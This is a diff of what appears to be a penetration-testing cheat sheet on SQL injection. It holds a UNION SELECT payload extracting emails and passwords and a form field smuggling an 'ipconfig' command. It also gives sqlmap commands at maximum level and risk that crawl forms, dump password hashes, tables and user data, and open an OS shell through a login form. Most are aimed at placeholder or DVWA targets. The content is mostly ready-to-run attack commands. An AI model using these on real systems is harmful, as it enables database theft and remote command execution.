@@ -58,6 +58,17 @@ http://target.com/article.aspx?article_id=0+UNION+SELECT+EMAIL,+USERID,+PASSWORD
 Newsletter signup > Subscribe:  joe@gmail.com & ipconfig > C:\inetpub\wwwroot\Book\test.txt
 ------------------------------------------------------------------------------------------------------
 
+sqlmap.py -u http://target.com --random-agent --batch --crawl=10 --forms --level=5 --risk=3
+
+-u		      URL
+--random-agent
+--batch	  Non-interactive mode, this accepts the default answers from sqlmap questions.
+--crawl	  How deep you want to crawl the site.
+--forms	  Parse and test forms.
+--level		 Different levels of tests, 1 is default and 5 is the most.
+--risk	   Different risk of tests, 1 is default and 3 is the most.
+------------------------------------------------------------------------------------------------------
+
 Use Burp to trap a request. Copy the request to /root/tmp.
 
 sqlmap -r /root/tmp --banner                                              Show webserver OS, apps and db
@@ -67,10 +78,8 @@ sqlmap -r /root/tmp --dbms=<db type> -p <parameter> -U <user> --passwords
 sqlmap -r /root/tmp --dbms=<db type> -D <database> --tables               Show all tables in a db
 sqlmap -r /root/tmp --dbms=<db type> -D <database> -T <table> --columns   Show all columns in a table
 sqlmap -r /root/tmp --dbms=<db type> -D <database> -T <table> --dump      Show all data in a table     
-------------------------------------------------------------------------------------------------------
 
-From: http://niiconsulting.com/checkmate/2014/01/from-sql-injection-to-0wnage-using-sqlmap/
-
+Example
 sqlmap.py --url=”http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#”
 --cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee"
 
@@ -84,11 +93,9 @@ sqlmap.py --url="http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit
 --cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee" -D dvwa -T users --columns
 
 sqlmap.py --url="http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" 
---cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee" -D dvwa -T users 
--C user_id,user,password --dump
+--cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee" -D dvwa -T users -C user_id,user,password --dump
 
-sqlmap.py --url="http://target.com/login.asp" --data="txtLoginID=shrikant&txtPassword=password&cmdSubmit=Login" 
---os-shell
+sqlmap.py --url="http://target.com/login.asp" --data="txtLoginID=shrikant&txtPassword=password&cmdSubmit=Login" --os-shell
 ------------------------------------------------------------------------------------------------------
 
 SELECT * FROM login WHERE id = 1 or 1=1 AND user LIKE "%root%"
